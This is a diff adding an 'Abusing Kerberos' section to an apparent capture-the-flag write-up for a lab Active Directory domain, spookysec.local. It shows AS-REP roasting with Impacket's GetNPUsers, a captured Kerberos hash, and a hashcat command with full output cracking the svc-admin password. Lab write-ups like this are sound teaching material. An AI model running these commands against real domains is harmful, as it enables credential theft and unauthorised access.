@@ -199,3 +199,110 @@ We notes this accounts :
 
 # Abusing Kerberos
 
+we can attempt to abuse a feature with an attack method called ASRreproasting. This occurs when a user account has the privilege “Does not require Pre-Authentication” set. So the account in question **does not** need to provide valid identification before requesting a Kerberos Ticket.
+
+So we'll use tool called `GetNpUsers`  from `Impacket`  that we can use to query ASReproastable accounts from the Key Distribution Center.
+
+and  it's takes valid username from `Kerbrute`  output , So we'll run the following command :
+
+Test backup username :
+```bash
+GetNPUsers spookysec.local/backup -no-pass -dc-ip <ip>
+```
+
+and i got this :
+
+```bash 
+Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Getting TGT for backup
+[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+lets test it with  svc-admin: 
+
+```bash 
+GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip <ip>
+```
+
+And here we go we got this great output 
+
+```bash 
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5dbf3fab08d44a414465862a7df602ca$b01ea118a95ae0c5479689cd138f9507b0bbf00ed4e4adbd7f47521566996703a5ec2021550040d732fb682e8c5f92aa911779fefb94cccf9b33fdd5d786bc3f1debffc6a04cdb85d2c7c7b631029dec8f0fd4d17619fa11e16d1feeac79bc4c0c7c2f71dbbbb85dab0ca67db56662a60caabeca1b64ff3841788f85245aba9ff902174d58f495be0b125a808489b384c1580adafaa69718c12b0605d6f161690b29574e426afcf8b737da61218ad84835d4eb274ed3b492d7de3c171fcb7fd1f1682c2c433cbd2cb95872607bd2b863c348b18be74cb51dd7ab2576fb054a50a93e8b73b6b9e15b97631f0395458dcf6152
+```
+
+Then we got a hash back! Looking at the [HashCat examples wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes), this appears to be Kerberos 5 AS-REP etype 23, which is mode 18200. We can save this full hash to a file and then specify the mode, hash and dictionary like  this command :
+
+```bash
+hashcat -m 18200 hash.txt passwordlist.txt
+```
+
+And we got this :
+
+```bash
+[👾]   )#  hashcat -m 18200 hash passwo                                                                             [/root]
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #1: cpu-haswell-Intel(R) Core(TM) i7-14650HX, 2856/5776 MB (1024 MB allocatable), 24MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 6 MB
+
+Dictionary cache built:
+* Filename..: passwo
+* Passwords.: 70188
+* Bytes.....: 569236
+* Keyspace..: 70188
+* Runtime...: 0 secs
+
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5dbf3fab08d44a414465862a7df602ca$b01ea118a95ae0c5479689cd138f9507b0bbf00ed4e4adbd7f47521566996703a5ec2021550040d732fb682e8c5f92aa911779fefb94cccf9b33fdd5d786bc3f1debffc6a04cdb85d2c7c7b631029dec8f0fd4d17619fa11e16d1feeac79bc4c0c7c2f71dbbbb85dab0ca67db56662a60caabeca1b64ff3841788f85245aba9ff902174d58f495be0b125a808489b384c1580adafaa69718c12b0605d6f161690b29574e426afcf8b737da61218ad84835d4eb274ed3b492d7de3c171fcb7fd1f1682c2c433cbd2cb95872607bd2b863c348b18be74cb51dd7ab2576fb054a50a93e8b73b6b9e15b97631f0395458dcf6152:management2005
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5dbf3fab08d...cf6152
+Time.Started.....: Tue Sep 23 09:32:18 2025 (0 secs)
+Time.Estimated...: Tue Sep 23 09:32:18 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (passwo)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   225.9 kH/s (2.29ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 12288/70188 (17.51%)
+Rejected.........: 0/12288 (0.00%)
+Restore.Point....: 0/70188 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: m123456 -> henrik
+Hardware.Mon.#1..: Util:  4%
+
+Started: Tue Sep 23 09:31:52 2025
+Stopped: Tue Sep 23 09:32:20 2025
+```
+
+So from the `hashcat` output the password is `management2005` .
+
+
+# Enumeration  – With Credentials
